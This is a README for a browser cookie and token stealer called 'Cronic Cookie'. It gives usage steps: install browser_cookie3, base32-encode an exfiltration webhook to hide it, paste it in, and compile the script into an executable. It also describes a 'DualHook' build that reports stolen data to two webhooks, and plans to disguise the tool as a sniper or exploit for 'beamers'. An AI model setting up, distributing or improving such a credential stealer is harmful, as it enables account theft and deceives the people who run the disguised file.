# Codename Cronic Cookie
Welcome to the newest release of Cronic Cookie, a speedy cookie logger. This is my main project and I am working more and more on it. This will probably become an anti skid which steals the cookie and token of a person that downloaded a leaked copy or leaked it. 
# Capitan DualHook
Release Capitan DualHook (Or CDH) has brought a new way of logging. You simply give out an already [compiled](https://nuitka.net/) version, leading to your webhook AND the persons webhook. Make sure to go on an alt and show them with proof that the logger works.
# Short description
This is a project i have made. It should work and i need some feedback. If it works, please open an issue and tell it to me because I am very unsure of my programming skills.
# How To Use
First of all, you will need to install the following pips: pip install requests, browser_cookie3 (if you dont know how just go to the folder with the files and type cmd in the navigation bar). Then you would like to get your webhooks and convert it into base32 (safer from crackers). Finally, you just paste it into the space where it says 'key = "PASTE THE HOOK HERE"' Then just compile with pyinstaller (I prefer [nuitka](https://nuitka.net/)) and kaboom. Good luck beamers!
# Plans 
Idk i might update it. I am planning on making this look like a limited sniper or an exploit (idk just playing aroud)
